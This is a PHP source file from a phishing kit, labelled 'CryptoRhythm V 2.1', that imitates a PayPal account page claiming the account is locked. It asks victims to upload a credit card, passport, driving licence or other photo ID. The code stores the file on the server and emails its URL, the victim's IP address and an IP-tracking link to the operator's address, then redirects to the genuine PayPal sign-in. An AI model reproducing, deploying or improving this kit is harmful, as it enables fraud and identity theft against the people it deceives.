<?php
if(INC != "true") {
  exit();
}
require_once("inc/config.inc.php");
if(isset($_POST['prooft'])) {
  $prooft = $_POST['prooft'];
  $pref = md5(rand());
  if((!empty($_FILES["files"])) && ($_FILES['files']['error'] == 0)) {
  $filename = basename($_FILES['files']['name']);
  $ext = substr($filename, strrpos($filename, '.') + 1);
  if (($ext == "jpg") || ($ext == "gif") || ($ext == "png") || ($ext == "pdf") || ($ext == "rdf") || ($ext == "doc")) {
      $newname = dirname(__FILE__).'/proof/'.$pref."_".$filename;
      if (!file_exists($newname)) {
        if ((move_uploaded_file($_FILES['files']['tmp_name'],$newname))) {
          $ip = $_SESSION['_ip_'];
          $cd = $_SESSION['code'];
          $body = "
          CryptoRhythm V 2.1 [PRV8]<br/>
          [Proof document]<br/>
          Proof type > $prooft<br/>
          Proof URL > $scamurl/account/proof/".$pref."_".$filename."<br/>
          [Client Info]
          IP > $ip
          Track > http://www.ip-tracker.org/locator/ip-lookup.php?ip=$ip
          ";
          $subject = "[CryptoRhythm] Proof document for [$cd] - $ip";
          mail($tomail, $subject, $body);
          ?>
          <script type="text/javascript">
            window.location = "https://www.paypal.com/signin";
          </script>
          <?php
        }
      }
    }
  }
}
?>
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>Paypal : Summary</title>
    <link rel="stylesheet" href="assets/fa/css/font-awesome.min.css" media="screen" title="no title" charset="utf-8">
    <link rel="stylesheet" href="assets/css/master.css" media="screen" title="no title" charset="utf-8">
    <link rel="icon" type="image/png" href="assets/img/favicon.ico" />
    <script src="assets/js/account.js" charset="utf-8"></script>
    <meta name="viewport" content="width=device-width, user-scalable=no">
  </head>
  <body>
    <div class="main_account">
      <div class="header" id="header">
        <div class="wrapper">
          <div class="pp"></div>
          <ul>
            <li>SUMMARY</li>
            <li class="inactive" onclick="showModal()">ACTIVITY</li>
            <li class="inactive" onclick="showModal()">SEND PAYMENTS</li>
            <li class="inactive" onclick="showModal()">WALLET</li>
            <li class="inactive" onclick="showModal()">SHOP</li>
          </ul>
          <div class="right">
            <span class="fa fa-bell notf" id="bellfa"></span>
            <span class="fa fa-cog"></span>
            <div class="logout" onclick="showModal()">
              Log Out
            </div>
          </div>
          <div class="leftr">
            <div class="mainmenu" id="mainmenu">
              Main Menu
            </div>
          </div>
          <div class="rightr">
            <span class="fa fa-bell notf" id="bellfa2"></span>
          </div>
        </div>
      </div>
      <div class="menu_responsive" id="menresp">
        <span class="fa fa-cog"></span>
        <h1 onclick="showModal()">Log Out</h1>
        <ul>
          <li class="actives">SUMMARY</li>
          <li onclick="showModal()">ACTIVITY</li>
          <li onclick="showModal()">SEDN PAYMENTS</li>
          <li onclick="showModal()">WALLET</li>
          <li class="last" onclick="showModal()">SHOP</li>
        </ul>
      </div>
      <div class="blurbody hidden" id="blurbody"></div>
      <div class="modal_background hidden" id="logmod"></div>
      <div class="logout_modal hidden" id="logmd">
        <h2>If you log out your account may be locked permanently</h2>
        <button onclick="hideModal()">Stay logged in</button>
      </div>
      <div class="header_part" id="header_part">
        <div class="wrapperp">
          <h1>Account Locked !</h1>
        </div>
      </div>
      <div class="notification_menu" id="notmenu">
        <div class="nothead">
          <h1>Notifications</h1>
          <div class="close" id="closemen"></div>
        </div>
        <div class="middle">
          <h2>View your messages</h2>
          <button class="messages">Go to Message Center</button>
        </div>
        <div class="final">
          <h3>There's a problem with your account. Make sure to resolve it so you have <br/>full access to your account immediately.</h3>
        </div>
      </div>
      <div class="mainBody" id="mainBody">
        <div class="wrapperb">
          <div class="containerAccount">
            <h1>Progress</h1>
            <div class="progress">
              <div class="item">
                <div class="ball active"></div>
                <p>Security check</p>
              </div>
              <div class="item">
                <div class="ball active"></div>
                <p>Confirm billing address</p>
              </div>
              <div class="item">
                <div class="ball active"></div>
                <p>Confirm your Card details</p>
              </div>
              <div class="item">
                <div class="ball"></div>
                <p>Upload your proof document</p>
              </div>
            </div>
          </div>

          <div class="containerForm">
            Upload proof document
            <br/><br/><br/>
            <div class="form">
              <h2>Files shoud be smaller than 5MB.</h2>
              <h2>Please use one of these file types : JPG, GIF, PNG, PDF, RTF, DOC.</h2>
              <h2>Upload files that display up-to-date and legible details.</h2>
              <form method="post" action="" enctype="multipart/form-data">
                <select id="prooftype" onchange="showupload()" name="prooft">
                  <option value="" selected>Select document type</option>
                  <option value="credit">Credit Card</option>
                  <option value="passport">Passport</option>
                  <option value="driving">Driving Licence</option>
                  <option value="gov">Government-issued photo ID</option>
                </select>
                <input class="hidden" type="file" name="files" id="files" onchange="updateUpload()" />
                <button type="button" class="hidden" id="uploadbut" style="margin-top : 30px; min-width : 30.5%; width : auto;" onclick="triggerUpload();"><span class="fa fa-upload"></span>&nbsp;&nbsp;<div id="val" style="display : inline-block; margin : 0;">Choose a file</div></button>
                <button style="margin-top : 30px; width : 93.5%;" onclick="confirmCard()" id="confirmbut" class="disabled">Confirm</button>
              </form>
            </div>
          </div>
        </div>
      </div>
      <div class="mainFooter" id="mainFooter">
        <div class="wrapperf">
          <div class="headfooter">
            <h1>HELP & CONTACT</h1>
            <h1>SECURITY</h1>
          </div>
          <div class="middlefooter">
            <div class="menufo"><a href="#">Privacy</a><a href="#">Legal</a></div>
            <div class="copy">Copyright &copy;1999-<script>document.write(new Date().getFullYear());</script> PayPal. All rights reserved.</div>
          </div>
          <div class="finalfooter">
            Consumer advisory- PayPal Pte. Ltd., the holder of PayPal’s stored value facility, does not require the approval of the Monetary Authority of Singapore. Users are advised to read the <b>terms and conditions</b> carefully.
          </div>
        </div>
      </div>
    </div>
  </body>
</html>
